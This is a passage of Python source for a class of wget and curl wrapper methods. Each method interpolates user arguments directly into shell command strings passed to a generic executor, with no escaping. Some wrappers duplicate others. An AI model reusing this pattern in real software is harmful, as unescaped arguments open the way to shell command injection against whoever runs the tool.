            return {'success': False, 'output': 'Usage: wget_referer <url> <referer>'}
        return self._generic(f'wget --referer={args[1]} {args[0]}')
    
    def _wget_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cookies <url> <cookie_file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_save_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_save_cookies <url> <cookie_file>'}
        return self._generic(f'wget --save-cookies={args[1]} {args[0]}')
    
    def _wget_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_limit_rate <url> <rate>'}
        return self._generic(f'wget --limit-rate={args[1]} {args[0]}')
    
    def _wget_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_timeout <url> <seconds>'}
        return self._generic(f'wget --timeout={args[1]} {args[0]}')
    
    def _wget_tries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_tries <url> <count>'}
        return self._generic(f'wget --tries={args[1]} {args[0]}')
    
    def _wget_retry(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_retry <url>'}
        return self._generic(f'wget --retry-connrefused {args[0]}')
    
    def _wget_no_check_cert(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_check_cert <url>'}
        return self._generic(f'wget --no-check-certificate {args[0]}')
    
    def _wget_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_certificate <url> <cert_file>'}
        return self._generic(f'wget --certificate={args[1]} {args[0]}')
    
    def _wget_private_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_private_key <url> <key_file>'}
        return self._generic(f'wget --private-key={args[1]} {args[0]}')
    
    def _wget_ca_certificate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_ca_certificate <url> <ca_file>'}
        return self._generic(f'wget --ca-certificate={args[1]} {args[0]}')
    
    def _wget_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_proxy <url> <proxy>'}
        return self._generic(f'wget -e use_proxy=yes -e http_proxy={args[1]} {args[0]}')
    
    def _wget_no_proxy(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_proxy <url>'}
        return self._generic(f'wget --no-proxy {args[0]}')
    
    def _wget_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user <url> <username>'}
        return self._generic(f'wget --user={args[1]} {args[0]}')
    
    def _wget_password(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_password <url> <password>'}
        return self._generic(f'wget --password={args[1]} {args[0]}')
    
    def _wget_post_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_data <url> <data>'}
        return self._generic(f'wget --post-data="{args[1]}" {args[0]}')
    
    def _wget_post_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_file <url> <file>'}
        return self._generic(f'wget --post-file={args[1]} {args[0]}')
    
    def _wget_method(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_method <url> <method>'}
        return self._generic(f'wget --method={args[1]} {args[0]}')
    
    def _wget_body_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_body_data <url> <data>'}
        return self._generic(f'wget --body-data="{args[1]}" {args[0]}')
    
    def _wget_body_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_body_file <url> <file>'}
        return self._generic(f'wget --body-file={args[1]} {args[0]}')
    
    def _wget_timestamping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_timestamping <url>'}
        return self._generic(f'wget -N {args[0]}')
    
    def _wget_no_clobber(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_clobber <url>'}
        return self._generic(f'wget -nc {args[0]}')
    
    def _wget_delete_after(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_delete_after <url>'}
        return self._generic(f'wget --delete-after {args[0]}')
    
    def _wget_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_progress <url>'}
        return self._generic(f'wget --progress=bar {args[0]}')
    
    def _wget_show_progress(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_show_progress <url>'}
        return self._generic(f'wget --show-progress {args[0]}')
    
    def _wget_config(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_config <config_file>'}
        return self._generic(f'wget --config={args[0]}')
    
    def _wget_append_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_append_output <url> <log_file>'}
        return self._generic(f'wget -a {args[1]} {args[0]}')
    
    def _wget_output_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output_file <url> <log_file>'}
        return self._generic(f'wget -o {args[1]} {args[0]}')
    
    def _wget_no_parent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_parent <url>'}
        return self._generic(f'wget -np {args[0]}')
    
    def _wget_cut_dirs(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cut_dirs <url> <count>'}
        return self._generic(f'wget --cut-dirs={args[1]} {args[0]}')
    
    def _wget_directory_prefix(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_directory_prefix <url> <dir>'}
        return self._generic(f'wget -P {args[1]} {args[0]}')
    
    def _wget_convert_links(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_convert_links <url>'}
        return self._generic(f'wget -k {args[0]}')
    
    def _wget_backup_converted(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_backup_converted <url>'}
        return self._generic(f'wget -K {args[0]}')
    
    def _wget_adjust_extension(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_adjust_extension <url>'}
        return self._generic(f'wget -E {args[0]}')
    
    def _wget_restrict_file_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_restrict_file_names <url>'}
        return self._generic(f'wget --restrict-file-names=unix {args[0]}')
    
    def _wget_trust_server_names(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_trust_server_names <url>'}
        return self._generic(f'wget --trust-server-names {args[0]}')
    
    def _wget_content_disposition(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_content_disposition <url>'}
        return self._generic(f'wget --content-disposition {args[0]}')
    
    def _wget_random_wait(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_random_wait <url>'}
        return self._generic(f'wget --random-wait {args[0]}')
    
    def _wget_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_wait <url> <seconds>'}
        return self._generic(f'wget -w {args[1]} {args[0]}')
    
    def _wget_waitretry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_waitretry <url> <seconds>'}
        return self._generic(f'wget --waitretry={args[1]} {args[0]}')
    
    def _wget_quota(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_quota <url> <quota>'}
        return self._generic(f'wget -Q {args[1]} {args[0]}')
    
    def _wget_dns_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_dns_timeout <url> <seconds>'}
        return self._generic(f'wget --dns-timeout={args[1]} {args[0]}')
    
    def _wget_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_connect_timeout <url> <seconds>'}
        return self._generic(f'wget --connect-timeout={args[1]} {args[0]}')
    
    def _wget_read_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_read_timeout <url> <seconds>'}
        return self._generic(f'wget --read-timeout={args[1]} {args[0]}')
    
    def _wget_retry_connrefused(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_retry_connrefused <url>'}
        return self._generic(f'wget --retry-connrefused {args[0]}')
    
    def _wget_inet4_only(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet4_only <url>'}
        return self._generic(f'wget -4 {args[0]}')
    
    def _wget_inet6_only(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet6_only <url>'}
        return self._generic(f'wget -6 {args[0]}')
    
    def _wget_prefer_family(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_prefer_family <url> <family>'}
        return self._generic(f'wget --prefer-family={args[1]} {args[0]}')
    
    def _wget_bind_address(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_bind_address <url> <ip>'}
        return self._generic(f'wget --bind-address={args[1]} {args[0]}')
    
    def _wget_no_dns_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_dns_cache <url>'}
        return self._generic(f'wget --no-dns-cache {args[0]}')
    
    def _wget_no_http_keep_alive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_http_keep_alive <url>'}
        return self._generic(f'wget --no-http-keep-alive {args[0]}')
    
    def _wget_no_cache(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cache <url>'}
        return self._generic(f'wget --no-cache {args[0]}')
    
    def _wget_no_cookies(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cookies <url>'}
        return self._generic(f'wget --no-cookies {args[0]}')
    
    def _wget_load_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_load_cookies <url> <file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_keep_session_cookies(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_keep_session_cookies <url> <file>'}
        return self._generic(f'wget --keep-session-cookies --save-cookies={args[1]} {args[0]}')
    
    def _wget_warc_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_warc_file <url> <prefix>'}
        return self._generic(f'wget --warc-file={args[1]} {args[0]}')
    
    def _wget_warc_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_warc_header <url> <header>'}
        return self._generic(f'wget --warc-header="{args[1]}" {args[0]}')
    
    def _wget_warc_max_size(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_warc_max_size <url> <size>'}
        return self._generic(f'wget --warc-max-size={args[1]} {args[0]}')
    
    def _wget_warc_cdx(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_warc_cdx <url>'}
        return self._generic(f'wget --warc-cdx {args[0]}')
    
    def _wget_warc_dedup(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_warc_dedup <url> <file>'}
        return self._generic(f'wget --warc-dedup={args[1]} {args[0]}')
    
    def _wget_no_warc_compression(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_warc_compression <url>'}
        return self._generic(f'wget --no-warc-compression {args[0]}')
    
    def _wget_no_warc_digests(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_warc_digests <url>'}
        return self._generic(f'wget --no-warc-digests {args[0]}')
    
    def _wget_no_warc_keep_log(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_warc_keep_log <url>'}
        return self._generic(f'wget --no-warc-keep-log {args[0]}')
    
    def _wget_warc_tempdir(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_warc_tempdir <url> <dir>'}
        return self._generic(f'wget --warc-tempdir={args[1]} {args[0]}')
    
    def _wget_help(self, args: List[str]) -> Dict:
        return self._generic('wget --help')
    
    def _wget_version(self, args: List[str]) -> Dict:
        return self._generic('wget --version')
    
    # ==================== Curl Commands ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        result = self.tools.curl(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        return self._generic(f'curl -s -X POST -d "{args[1]}" {args[0]}')
    
    def _curl_put(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        return self._generic(f'curl -s -X PUT -d "{args[1]}" {args[0]}')
    
    def _curl_delete(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_delete <url>'}
        return self._generic(f'curl -s -X DELETE {args[0]}')
    
    def _curl_patch(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        return self._generic(f'curl -s -X PATCH -d "{args[1]}" {args[0]}')
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        return self._generic(f'curl -s -I {args[0]}')
    
    def _curl_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        return self._generic(f'curl -s -X OPTIONS {args[0]}')
    
    def _curl_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_output <url> <file>'}
        return self._generic(f'curl -s -o {args[1]} {args[0]}')
    
    def _curl_remote_name(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_remote_name <url>'}
        return self._generic(f'curl -s -O {args[0]}')
    
    def _curl_location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_location <url>'}
        return self._generic(f'curl -s -L {args[0]}')
    
    def _curl_include(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_include <url>'}
        return self._generic(f'curl -s -i {args[0]}')
    
    def _curl_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        return self._generic(f'curl -v {args[0]}')
    
    def _curl_silent(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_silent <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_show_error(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_show_error <url>'}
        return self._generic(f'curl -sS {args[0]}')
    
    def _curl_fail(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_fail <url>'}
        return self._generic(f'curl -sf {args[0]}')
    
    def _curl_insecure(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_insecure <url>'}
        return self._generic(f'curl -sk {args[0]}')
    
    def _curl_data(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data <url> <data>'}
        return self._generic(f'curl -s -d "{args[1]}" {args[0]}')
    
    def _curl_data_binary(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_binary <url> <file>'}
        return self._generic(f'curl -s --data-binary @{args[1]} {args[0]}')
    
    def _curl_data_urlencode(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_urlencode <url> <data>'}
        return self._generic(f'curl -s --data-urlencode "{args[1]}" {args[0]}')
    
    def _curl_data_raw(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_data_raw <url> <data>'}
        return self._generic(f'curl -s --data-raw "{args[1]}" {args[0]}')
    
    def _curl_form(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_form <url> <name> <value>'}
        return self._generic(f'curl -s -F "{args[1]}={args[2]}" {args[0]}')
    
    def _curl_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_header <url> <header>'}
        return self._generic(f'curl -s -H "{args[1]}" {args[0]}')
    
    def _curl_user_agent(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user_agent <url> <agent>'}
        return self._generic(f'curl -s -A "{args[1]}" {args[0]}')
    
    def _curl_referer(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_referer <url> <referer>'}
        return self._generic(f'curl -s -e "{args[1]}" {args[0]}')
    
    def _curl_user(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user <url> <user:pass>'}
        return self._generic(f'curl -s -u "{args[1]}" {args[0]}')
    
    def _curl_basic(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_basic <url> <user:pass>'}
        return self._generic(f'curl -s --basic -u "{args[1]}" {args[0]}')
    
    def _curl_digest(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_digest <url> <user:pass>'}
        return self._generic(f'curl -s --digest -u "{args[1]}" {args[0]}')
    
    def _curl_ntlm(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ntlm <url> <user:pass>'}
        return self._generic(f'curl -s --ntlm -u "{args[1]}" {args[0]}')
    
    def _curl_negotiate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_negotiate <url> <user:pass>'}
        return self._generic(f'curl -s --negotiate -u "{args[1]}" {args[0]}')
    
    def _curl_cookie(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie <url> <cookie>'}
        return self._generic(f'curl -s -b "{args[1]}" {args[0]}')
    
    def _curl_cookie_jar(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookie_jar <url> <file>'}
        return self._generic(f'curl -s -c {args[1]} {args[0]}')
    
    def _curl_proxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy <url> <proxy>'}
        return self._generic(f'curl -s -x {args[1]} {args[0]}')
    
    def _curl_proxy_user(self, args: List[str]) -> Dict:
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_proxy_user <url> <proxy> <user:pass>'}
        return self._generic(f'curl -s -x {args[1]} --proxy-user "{args[2]}" {args[0]}')
    
    def _curl_noproxy(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_noproxy <url> <hosts>'}
        return self._generic(f'curl -s --noproxy "{args[1]}" {args[0]}')
    
    def _curl_cert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cert <url> <cert>'}
        return self._generic(f'curl -s -E {args[1]} {args[0]}')
    
    def _curl_key(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_key <url> <key>'}
        return self._generic(f'curl -s --key {args[1]} {args[0]}')
    
    def _curl_cacert(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cacert <url> <ca>'}
        return self._generic(f'curl -s --cacert {args[1]} {args[0]}')
    
    def _curl_capath(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_capath <url> <path>'}
        return self._generic(f'curl -s --capath {args[1]} {args[0]}')
    
    def _curl_ciphers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_ciphers <url> <ciphers>'}
        return self._generic(f'curl -s --ciphers {args[1]} {args[0]}')
    
    def _curl_tlsv1_2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_2 <url>'}
        return self._generic(f'curl -s --tlsv1.2 {args[0]}')
    
    def _curl_tlsv1_3(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tlsv1_3 <url>'}
        return self._generic(f'curl -s --tlsv1.3 {args[0]}')
    
    def _curl_continue_at(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_continue_at <url>'}
        return self._generic(f'curl -s -C - {args[0]}')
    
    def _curl_range(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_range <url> <range>'}
        return self._generic(f'curl -s -r {args[1]} {args[0]}')
    
    def _curl_limit_rate(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_limit_rate <url> <rate>'}
        return self._generic(f'curl -s --limit-rate {args[1]} {args[0]}')
    
    def _curl_max_filesize(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_filesize <url> <size>'}
        return self._generic(f'curl -s --max-filesize {args[1]} {args[0]}')
    
    def _curl_max_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_time <url> <seconds>'}
        return self._generic(f'curl -s -m {args[1]} {args[0]}')
    
    def _curl_connect_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_timeout <url> <seconds>'}
        return self._generic(f'curl -s --connect-timeout {args[1]} {args[0]}')
    
    def _curl_retry(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry <url> <count>'}
        return self._generic(f'curl -s --retry {args[1]} {args[0]}')
    
    def _curl_retry_delay(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry_delay <url> <seconds>'}
        return self._generic(f'curl -s --retry-delay {args[1]} {args[0]}')
    
    def _curl_retry_max_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry_max_time <url> <seconds>'}
        return self._generic(f'curl -s --retry-max-time {args[1]} {args[0]}')
    
    def _curl_retry_connrefused(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_retry_connrefused <url>'}
        return self._generic(f'curl -s --retry-connrefused {args[0]}')
    
    def _curl_keepalive_time(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_keepalive_time <url> <seconds>'}
        return self._generic(f'curl -s --keepalive-time {args[1]} {args[0]}')
    
    def _curl_no_keepalive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_keepalive <url>'}
        return self._generic(f'curl -s --no-keepalive {args[0]}')
    
    def _curl_tcp_nodelay(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_tcp_nodelay <url>'}
        return self._generic(f'curl -s --tcp-nodelay {args[0]}')
    
    def _curl_ipv4(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv4 <url>'}
        return self._generic(f'curl -s -4 {args[0]}')
    
    def _curl_ipv6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ipv6 <url>'}
        return self._generic(f'curl -s -6 {args[0]}')
    
    def _curl_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_interface <url> <interface>'}
        return self._generic(f'curl -s --interface {args[1]} {args[0]}')
    
    def _curl_local_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_local_port <url> <port>'}
        return self._generic(f'curl -s --local-port {args[1]} {args[0]}')
    
    def _curl_dns_servers(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_dns_servers <url> <servers>'}
        return self._generic(f'curl -s --dns-servers {args[1]} {args[0]}')
    
    def _curl_resolve(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_resolve <url> <host:port:addr>'}
        return self._generic(f'curl -s --resolve {args[1]} {args[0]}')
    
    def _curl_connect_to(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_to <url> <host:port:addr>'}
        return self._generic(f'curl -s --connect-to {args[1]} {args[0]}')
    
    def _curl_unix_socket(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_unix_socket <url> <socket>'}
        return self._generic(f'curl -s --unix-socket {args[1]} {args[0]}')
    
    def _curl_http1_0(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http1_0 <url>'}
        return self._generic(f'curl -s --http1.0 {args[0]}')
    
    def _curl_http1_1(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http1_1 <url>'}
        return self._generic(f'curl -s --http1.1 {args[0]}')
    
    def _curl_http2(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http2 <url>'}
        return self._generic(f'curl -s --http2 {args[0]}')
    
    def _curl_http3(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_http3 <url>'}
        return self._generic(f'curl -s --http3 {args[0]}')
    
    def _curl_compressed(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_compressed <url>'}
        return self._generic(f'curl -s --compressed {args[0]}')
    
    def _curl_raw(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_raw <url>'}
        return self._generic(f'curl -s --raw {args[0]}')
    
    def _curl_ignore_content_length(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_ignore_content_length <url>'}
        return self._generic(f'curl -s --ignore-content-length {args[0]}')
    
    def _curl_no_buffer(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_buffer <url>'}
        return self._generic(f'curl -s -N {args[0]}')
    
    def _curl_write_out(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_write_out <url> <format>'}
        return self._generic(f'curl -s -w "{args[1]}" -o /dev/null {args[0]}')
    
    def _curl_dump_header(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_dump_header <url> <file>'}
        return self._generic(f'curl -s -D {args[1]} {args[0]}')
    
    def _curl_trace(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_trace <url> <file>'}
        return self._generic(f'curl -s --trace {args[1]} {args[0]}')
    
    def _curl_trace_ascii(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_trace_ascii <url> <file>'}
        return self._generic(f'curl -s --trace-ascii {args[1]} {args[0]}')
    
    def _curl_manual(self, args: List[str]) -> Dict:
        return self._generic('curl --manual')
    
    def _curl_help(self, args: List[str]) -> Dict:
        return self._generic('curl --help')
    
    def _curl_version(self, args: List[str]) -> Dict:
        return self._generic('curl --version')
    
    def _curl_parallel(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_parallel <url1> <url2>'}
        return self._generic(f'curl -s -Z "{args[0]}" "{args[1]}"')
    
    def _curl_config(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_config <config_file>'}
        return self._generic(f'curl -s -K {args[0]}')
    
    def _curl_next(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_next <url1> <url2>'}
        return self._generic(f'curl -s {args[0]} --next {args[1]}')
    
    def _curl_styled_output(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_styled_output <url>'}
        return self._generic(f'curl -s --styled-output {args[0]}')
    
    def _curl_no_styled_output(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_styled_output <url>'}
        return self._generic(f'curl -s --no-styled-output {args[0]}')
    
    def _curl_progress_bar(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_progress_bar <url>'}
        return self._generic(f'curl -s -# {args[0]}')
    
    def _curl_no_progress_meter(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_no_progress_meter <url>'}
        return self._generic(f'curl -s --no-progress-meter {args[0]}')
    
    def _curl_url_query(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_url_query <url> <query>'}
        return self._generic(f'curl -s --url-query "{args[1]}" {args[0]}')
    
    def _curl_json(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_json <url> <json>'}
        return self._generic(f'curl -s --json "{args[1]}" {args[0]}')
    
